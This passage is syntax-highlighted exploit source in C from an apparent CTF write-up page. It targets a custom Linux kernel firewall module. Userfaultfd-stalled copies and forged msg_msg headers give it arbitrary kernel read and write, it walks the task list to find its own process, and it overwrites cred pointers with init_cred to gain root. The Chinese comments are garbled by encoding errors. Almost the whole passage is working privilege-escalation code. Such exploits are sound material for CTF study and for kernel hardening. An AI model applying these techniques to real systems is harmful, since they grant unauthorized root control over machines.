class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;byteswap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/timerfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/reboot.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> page_size 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_RULE 0x1337babe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELETE_RULE 0xdeadbabe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EDIT_RULE 0x1337beef</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHOW_RULE 0xdeadbeef</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DUP_RULE 0xbaad5aad</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INBOUND 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OUTBOUND 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SKIP -1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> ip[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> netmask[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> idx;</span><br><span class="line">    <span class="keyword">uint8_t</span> type;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">&#125; User_rule_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> ip;</span><br><span class="line">    <span class="keyword">uint32_t</span> netmask;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">    <span class="keyword">uint8_t</span> is_duplicated;</span><br><span class="line">&#125; Rule_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;user_msg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ll_next;</span><br><span class="line">    <span class="keyword">void</span> *ll_prev;</span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;</span><br><span class="line">    <span class="keyword">void</span> *next;</span><br><span class="line">    <span class="keyword">void</span> *security;</span><br><span class="line">&#125;msg_header;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> msg_id[<span class="number">3</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">size_t</span> <span class="built_in">queue</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernelbase=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> page_msg=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> init_task=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> init_cred=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> current_task=<span class="number">0</span>,prev_task=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *page1=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *page2=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">pthread_t</span> td[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">int</span> is_write_msg=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;exp.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">err_exit</span><span class="params">(<span class="keyword">char</span> *err)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;31m %s\e[0m\n&quot;</span>,err);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_IPv4</span><span class="params">(<span class="keyword">uint32_t</span> ip,<span class="keyword">char</span> *ipv4)</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(ipv4,<span class="number">0</span>,<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printf(&quot;%d.%d.%d.%d\n&quot;,(ip&amp;0xff),(ip&amp;0x0000ff00)&gt;&gt;8,(ip&amp;0x00ff0000)&gt;&gt;16,(ip&amp;0xff000000)&gt;&gt;24);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(ipv4,<span class="string">&quot;%d.%d.%d.%d&quot;</span>,(ip&amp;<span class="number">0xff</span>),(ip&amp;<span class="number">0x0000ff00</span>)&gt;&gt;<span class="number">8</span>,(ip&amp;<span class="number">0x00ff0000</span>)&gt;&gt;<span class="number">16</span>,(ip&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">User_rule_t* <span class="title">init_user_rule</span><span class="params">(<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type,<span class="keyword">u_int32_t</span> ip,<span class="keyword">u_int32_t</span> netmask)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    User_rule_t *user_rule=(User_rule_t *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(User_rule_t));</span><br><span class="line"></span><br><span class="line">    user_rule-&gt;idx=idx;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    get_IPv4(ip,&amp;(user_rule-&gt;ip));</span><br><span class="line"></span><br><span class="line">    get_IPv4(netmask,&amp;(user_rule-&gt;netmask));</span><br><span class="line"></span><br><span class="line">    user_rule-&gt;type=type;</span><br><span class="line">    <span class="keyword">return</span> user_rule;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,ADD_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;add fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,DELETE_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;del fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dup_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,DUP_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;edit fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf,<span class="keyword">int</span> idx,<span class="keyword">int</span> type,<span class="keyword">int</span> flags)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> ip=*(<span class="keyword">uint32_t</span> *)(buf+<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> netmask=*(<span class="keyword">uint32_t</span> *)(buf+<span class="number">0x24</span>);</span><br><span class="line">    User_rule_t *user_rule=init_user_rule(idx,type,ip,netmask);</span><br><span class="line">    <span class="built_in">memcpy</span>(user_rule,buf,<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span>(!flags)&#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;(user_rule-&gt;ip),<span class="string">&quot;qqqqqqqqqq&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;qqqqqqqqqq&quot;</span>));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;(user_rule-&gt;netmask),<span class="string">&quot;qqqqqqqqqq&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;qqqqqqqqqq&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,EDIT_RULE,user_rule);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msgflg)) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msqid,<span class="keyword">void</span> *msgp,<span class="keyword">size_t</span> msgsz,<span class="keyword">long</span> msgtype,<span class="keyword">int</span> msgflag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret=msgrcv(msqid,msgp,msgsz,msgtype,msgflag);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgrcv fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msqid,<span class="keyword">void</span> *msgp,<span class="keyword">size_t</span> msgsz,<span class="keyword">int</span> msgflag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret=msgsnd(msqid,msgp,msgsz,msgflag);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgsend fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_userfault</span><span class="params">(<span class="keyword">uint64_t</span> fault_page, <span class="keyword">uint64_t</span> fault_page_len, <span class="keyword">void</span> *(*func)(<span class="keyword">void</span> *), <span class="keyword">pthread_t</span> *thr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">  <span class="comment">// pthread_t thr;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint64_t</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">  ua.api = UFFD_API;</span><br><span class="line">  ua.features = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">    err_exit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">  ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;</span><br><span class="line">  ur.range.len   = fault_page_len;</span><br><span class="line">  ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">  <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)</span><br><span class="line">    err_exit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);  </span><br><span class="line">  <span class="keyword">int</span> s = pthread_create(thr, <span class="literal">NULL</span>, func, (<span class="keyword">void</span>*)uffd); </span><br><span class="line">  <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">    err_exit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// handler1(): put forged data on (page_1+0x1000), QID #2&#x27;s msg.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">handler_write_msg</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg1</span>;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] handler_write_msg created&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">  <span class="keyword">int</span> nready;</span><br><span class="line">  pollfd.fd      = uffd;</span><br><span class="line">  pollfd.events  = POLLIN;</span><br><span class="line">  nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (nready != <span class="number">1</span>)  <span class="comment">// è¿™ä¼šä¸€ç›´ç­‰å¾…ï¼Œç›´åˆ°copy_from_user/copy_to_userè®¿é—®FAULT_PAGE</span></span><br><span class="line">    err_exit(<span class="string">&quot;[-] Wrong pool return value&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read(uffd, &amp;msg1, <span class="keyword">sizeof</span>(msg1)) != <span class="keyword">sizeof</span>(msg1)) <span class="comment">// ä»uffdè¯»å–msgç»“æ„ï¼Œè™½ç„¶æ²¡ç”¨</span></span><br><span class="line">    err_exit(<span class="string">&quot;[-] Error in reading uffd_msg&quot;</span>);</span><br><span class="line">  assert(msg1.event == UFFD_EVENT_PAGEFAULT);</span><br><span class="line">  <span class="keyword">if</span> (msg1.arg.pagefault.address == (page1 + page_size))</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[*] page fault 1 at page1+0x1000\n&quot;</span>);</span><br><span class="line">      <span class="keyword">char</span> buffer[<span class="number">0x2000</span>];  <span class="comment">// é¢„å…ˆè®¾ç½®å¥½bufferå†…å®¹ï¼Œå¾€ç¼ºé¡µå¤„è¿›è¡Œæ‹·è´</span></span><br><span class="line">      <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">      msg_header fake_msg_header;</span><br><span class="line">      fake_msg_header.m_type = <span class="number">1</span>;</span><br><span class="line">      fake_msg_header.m_ts   = <span class="number">0x1000</span>;</span><br><span class="line">      fake_msg_header.next   = current_task+<span class="number">0x538</span><span class="number">-0x8</span>;</span><br><span class="line">      <span class="built_in">memcpy</span>(buffer+<span class="number">0xfd0</span><span class="number">-0x8</span>, (<span class="keyword">void</span> *)&amp;fake_msg_header, <span class="keyword">sizeof</span>(msg_header));  <span class="comment">// msg_msgseg.next - 8 bytes (we should skip this 8 bytes)</span></span><br><span class="line">    <span class="comment">//   memset(buffer,0x61,0x2000);</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">      uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)buffer;</span><br><span class="line">      uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page1+page_size; <span class="comment">// (unsigned long) msg1.arg.pagefault.address &amp; ~(page_size - 1);</span></span><br><span class="line">      uc.len = <span class="number">0x1000</span>;</span><br><span class="line">      uc.mode = <span class="number">0</span>;</span><br><span class="line">      uc.copy = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">//   printf(&quot;asdf\n&quot;);</span></span><br><span class="line">          <span class="keyword">if</span> (is_write_msg)</span><br><span class="line">          &#123;</span><br><span class="line">              ioctl(uffd, UFFDIO_COPY, &amp;uc); <span class="comment">// æ¢å¤æ‰§è¡Œcopy_from_user</span></span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;write msg ok\n&quot;</span>);</span><br><span class="line">              <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">handler_write_task</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg1</span>;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] handler_write_task created&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">  <span class="keyword">int</span> nready;</span><br><span class="line">  pollfd.fd      = uffd;</span><br><span class="line">  pollfd.events  = POLLIN;</span><br><span class="line">  nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (nready != <span class="number">1</span>)  <span class="comment">// è¿™ä¼šä¸€ç›´ç­‰å¾…ï¼Œç›´åˆ°copy_from_user/copy_to_userè®¿é—®FAULT_PAGE</span></span><br><span class="line">    err_exit(<span class="string">&quot;[-] Wrong pool return value&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read(uffd, &amp;msg1, <span class="keyword">sizeof</span>(msg1)) != <span class="keyword">sizeof</span>(msg1))  <span class="comment">// ä»uffdè¯»å–msgç»“æ„ï¼Œè™½ç„¶æ²¡ç”¨</span></span><br><span class="line">    err_exit(<span class="string">&quot;[-] Error in reading uffd_msg&quot;</span>);</span><br><span class="line">  assert(msg1.event == UFFD_EVENT_PAGEFAULT);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (msg1.arg.pagefault.address == (page2 + page_size))</span><br><span class="line">  &#123;</span><br><span class="line">      </span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[+] page fault 2 at page2+0x1000\n&quot;</span>);</span><br><span class="line">      is_write_msg = <span class="number">1</span>;                                <span class="comment">// wait for page fault 1</span></span><br><span class="line">      sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">//   pthread_join(td[0],NULL);</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[*] msg next write is ok\n&quot;</span>);</span><br><span class="line">      <span class="keyword">char</span> buffer[<span class="number">0x2000</span>]; </span><br><span class="line">      *(<span class="keyword">size_t</span> *)(buffer+<span class="number">0x1000</span><span class="number">-0x30</span>)=init_cred;</span><br><span class="line">      *(<span class="keyword">size_t</span> *)(buffer+<span class="number">0x1000</span><span class="number">-0x30</span>+<span class="number">8</span>)=init_cred;</span><br><span class="line"></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">      uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)buffer;</span><br><span class="line">      uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page2+page_size; <span class="comment">// (unsigned long) msg1.arg.pagefault.address &amp; ~(page_size - 1);</span></span><br><span class="line">      uc.len = <span class="number">0x1000</span>;</span><br><span class="line">      uc.mode = <span class="number">0</span>;</span><br><span class="line">      uc.copy = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      ioctl(uffd, UFFDIO_COPY, &amp;uc); <span class="comment">// æ¢å¤æ‰§è¡Œcopy_from_user</span></span><br><span class="line">  &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;write task ok\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;33m debug\e[0m\n&quot;</span>);</span><br><span class="line">    add_rule(fd,<span class="number">3</span>,INBOUND);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_current_task</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    msg_header fake_msg_header;</span><br><span class="line">    <span class="keyword">char</span> re_buf[<span class="number">0x2000</span>];</span><br><span class="line">    current_task=init_task;</span><br><span class="line">    fake_msg_header.ll_next=(<span class="keyword">void</span> *)<span class="number">0x4141414141414141</span>;</span><br><span class="line">    fake_msg_header.ll_prev=(<span class="keyword">void</span> *)<span class="number">0x4242424242424242</span>;</span><br><span class="line">    fake_msg_header.m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header.m_ts=<span class="number">0x2000</span>;</span><br><span class="line">    </span><br><span class="line">    fake_msg_header.next=current_task+<span class="number">0x290</span>;</span><br><span class="line">    edit_rule(fd,&amp;fake_msg_header,<span class="number">0</span>,OUTBOUND,<span class="number">1</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0x2000</span>,<span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">    pid=*(<span class="keyword">int</span> *)(re_buf+(<span class="number">0x1000</span><span class="number">-0x30</span>)+<span class="number">0x8</span>+<span class="number">0x100</span>);</span><br><span class="line">    prev_task=*(<span class="keyword">size_t</span> *)(re_buf+(<span class="number">0x1000</span><span class="number">-0x30</span>)+<span class="number">0x8</span>+<span class="number">0x8</span>)<span class="number">-0x298</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m pid:%d  getpid:%d \e[0m\n&quot;</span>,pid,getpid());</span><br><span class="line">    <span class="keyword">while</span>(pid!=getpid())&#123;</span><br><span class="line">        current_task=prev_task;</span><br><span class="line">        fake_msg_header.next=current_task+<span class="number">0x290</span>;</span><br><span class="line">        edit_rule(fd,&amp;fake_msg_header,<span class="number">0</span>,OUTBOUND,<span class="number">1</span>);</span><br><span class="line">        get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0x2000</span>,<span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">        pid=*(<span class="keyword">int</span> *)(re_buf+(<span class="number">0x1000</span><span class="number">-0x30</span>)+<span class="number">0x8</span>+<span class="number">0x100</span>);</span><br><span class="line">        prev_task=*(<span class="keyword">size_t</span> *)(re_buf+(<span class="number">0x1000</span><span class="number">-0x30</span>)+<span class="number">0x8</span>+<span class="number">0x8</span>)<span class="number">-0x298</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m pid:%d  getpid:%d \e[0m\n&quot;</span>,pid,getpid());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_page_msg_next</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    *(<span class="keyword">size_t</span> *)(page1+<span class="number">0x1000</span><span class="number">-0x8</span>)=<span class="number">0x1</span>;</span><br><span class="line">    send_msg(msg_id[<span class="number">2</span>],page1+<span class="number">0x1000</span><span class="number">-0x8</span>,<span class="number">0x2000</span><span class="number">-0x8</span><span 